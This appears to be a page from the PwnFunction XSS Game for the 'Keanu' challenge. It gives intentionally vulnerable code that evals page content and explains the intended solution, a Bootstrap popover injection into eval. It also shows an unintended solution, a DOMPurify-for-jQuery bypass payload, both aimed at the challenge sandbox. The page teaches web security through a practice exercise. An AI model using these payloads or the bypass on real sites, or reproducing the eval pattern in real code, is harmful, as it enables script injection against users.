---
title: "XSS Game - Keanu | PwnFunction"
header: "Keanu"
challengeUrl: "https://sandbox.pwnfunction.com/challenges/keanu.html"
date: 2020-01-19T14:59:07+05:30
draft: false
type: challenge
difficulty: Medium
solvers: 9
---

<!-- Rules -->
{{< rules >}}
<li>Difficulty is <b>Medium</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
<li>Unintended solution? DM me <a target="_blank"
                            href="https://twitter.com/messages/compose?recipient_id=1084132461133451264"
                            class="function">@PwnFunction</a>.
                    </li>
{{</ rules >}}

<!-- Challenge Code -->
{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;number id=&#x22;number&#x22; style=&#x22;display:none&#x22;&#x3E;&#x3C;/number&#x3E;
&#x3C;div class=&#x22;alert alert-primary&#x22; role=&#x22;alert&#x22; id=&#x22;welcome&#x22;&#x3E;&#x3C;/div&#x3E;
&#x3C;button id=&#x22;keanu&#x22; class=&#x22;btn btn-primary btn-sm&#x22; data-toggle=&#x22;popover&#x22; data-content=&#x22;DM @PwnFunction&#x22;
    data-trigger=&#x22;hover&#x22; onclick=&#x22;alert(&#x60;If you solved it, DM me @PwnFunction :)&#x60;)&#x22;&#x3E;Solved it?&#x3C;/button&#x3E;
    
&#x3C;script&#x3E;
    /* Input */
    var number = (new URL(location).searchParams.get(&#x27;number&#x27;) || &#x22;7&#x22;)[0],
        name = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;name&#x27;), { SAFE_FOR_JQUERY: true });
    $(&#x27;number#number&#x27;).html(number);
    document.getElementById(&#x27;welcome&#x27;).innerHTML = (&#x60;Welcome &#x3C;b&#x3E;${name || &#x22;Mr. Wick&#x22;}!&#x3C;/b&#x3E;&#x60;);

    /* Greet */
    $(&#x27;#keanu&#x27;).popover(&#x27;show&#x27;)
    setTimeout(_ =&#x3E; {
        $(&#x27;#keanu&#x27;).popover(&#x27;hide&#x27;)
    }, 2000)

    /* Check Magic Number */
    var magicNumber = Math.floor(Math.random() * 10);
    var number = eval($(&#x27;number#number&#x27;).html());
    if (magicNumber === number) {
        alert(&#x22;You&#x27;re Breathtaking!&#x22;)
    }
&#x3C;/script&#x3E;</code>{{< /code >}}

<!-- Solution Modal -->
{{< solution >}}
<h3>Intended</h3>
<p>Looking at the code, we'll see that it takes in two GET parameters <code>number</code> and
<code>name</code>. <code>number</code> can only be one character and <code>name</code> can be an
arbitrary value, but it's sanitized using <a href="https://github.com/cure53/DOMPurify"
    target="_blank"><b>DOMPurify</b></a>. The website also uses <a
    href="https://getbootstrap.com/"><b>Bootstrap</b></a>. The goal is to make our input land
inside the <code>eval</code>.
<pre
    class="solution-code-block"><code class="language-js">eval($('number#number').html())</code></pre>
We do control <code>$('number#number')</code>, but the issue is that it can only be one
character long. Now the question can we append some data to this tag before it lands into
<code>eval</code>? <br>
<br>
Yes, we can. <br>
Fortunately, we have <a
    href="https://getbootstrap.com/docs/4.0/components/popovers/"><b>Bootstrap Popovers</b></a>,
which is just an HTML popover, but the nice thing about this is that we can tell where this
popover should go using <code>data-container</code>. If we set the
<code>data-container=number</code>, this will insert the popover inside <code>number</code>
element, which is exactly what we need. <br><br>

Consider the following.
<pre class="solution-code-block"><code class="language-markup">number=7
name=&#x3C;button data-toggle=popover data-container=number data-content=&#x22;blah blah&#x22;&#x3E;</code></pre>

The resulting <code>number.innerHTML</code> will be the following.
<pre
    class="solution-code-block"><code class="language-markup">7&#x3C;some-popover-template-html-code&#x3E;blah blah&#x3C;some-popover-template-html-code&#x3E;</code></pre>
<br>

Now we can control the value that lands inside <code>eval</code>, but it's not valid Javascript.
To make this a valid Javascript code, we need to get rid of the popover HTML template. We
usually think about comments to get rid of some code, but here, the value of <code>number</code>
can only be a character long, so we instead use strings. <br><br>

Consider the following.
<pre class="solution-code-block"><code class="language-markup">number='
name=&#x3C;button data-toggle=popover data-container=number data-content=&#x22;'-alert(1337)//&#x22;&#x3E;</code></pre>

The resulting <code>number.innerHTML</code> will be the following.
<pre
    class="solution-code-block"><code class="language-js">&#x27;&#x3C;some-popover-template-html-code&#x3E;&#x27;-alert(1337)//&#x3C;some-popover-template-html-code&#x3E;</code></pre>
<br>

If we try this, the XSS wouldn't work, because <code>popover('show')</code> has to be called on
our popover element, so that Bootstrap would inject our code to the <code>number</code> tag. But
there's
already <code>popover('show')</code> called on <code>#keanu</code>. We can set the <b>id</b> to
<code>keanu</code>
so that Bootstrap would use our button instead of the already exisiting one. <br><br>

Final Solution
<pre
    class="solution-code-block"><code class="language-markup">number='
name=&#x3C;button data-toggle=popover data-container=number id=keanu data-content=&#x22;'-alert(1337)//&#x22;&#x3E;</code></pre>
</p>
<br>
<h3>Unintended (<a href="https://twitter.com/@Int3rN3t3r" target="_blank">@Int3rN3t3r</a>)</h3>
<pre
    class="solution-code-block"><code class="language-markup">name=&#x3C;img x=&#x22;/&#x3E;&#x3C;img src=x onerror=alert(1337)&#x3E;&#x22; y=&#x22;&#x3C;x&#x22;&#x3E;</code></pre>

This was possible because of a recent <a href="https://github.com/cure53/DOMPurify/commit/0bb582df5a732f06f43790cfb7da006c851fbe7f" target="_blank" class="function">DOMPurify bypass for Jquery</a> found by <a href="https://twitter.com/kinugawamasato" target="_blank" class="pwn">Masato Kinugawa</a>.
{{< /solution >}}

<!-- Solvers -->
{{< solvers >}}
<tr>
    <th scope="row">1</th>
    <td><a href="https://twitter.com/@lbherrera_" target="_blank"
            class="function">@lbherrera_</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">2</th>
    <td><a href="https://twitter.com/@terjanq" target="_blank" class="function">@terjanq</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">3</th>
    <td><a href="https://twitter.com/@RenwaX23" target="_blank"
            class="function">@RenwaX23</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">4</th>
    <td><a href="https://twitter.com/@Abdulahhusam" target="_blank"
            class="function">@Abdulahhusam</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">5</th>
    <td><a href="https://twitter.com/@suskind" target="_blank" class="function">@suskind</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">6</th>
    <td><a href="https://twitter.com/@Zeev42746664" target="_blank"
            class="function">@Zeev42746664</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">7</th>
    <td><a href="https://twitter.com/@BenHayak" target="_blank"
            class="function">@BenHayak</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">8</th>
    <td><a href="https://twitter.com/@20backslash" target="_blank"
            class="function">@20backslash</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">9</th>
    <td><a href="https://twitter.com/@Int3rN3t3r" target="_blank"
            class="function">@Int3rN3t3r</a>
    </td>
    <td>Unintended</td>
</tr>
{{< /solvers >}}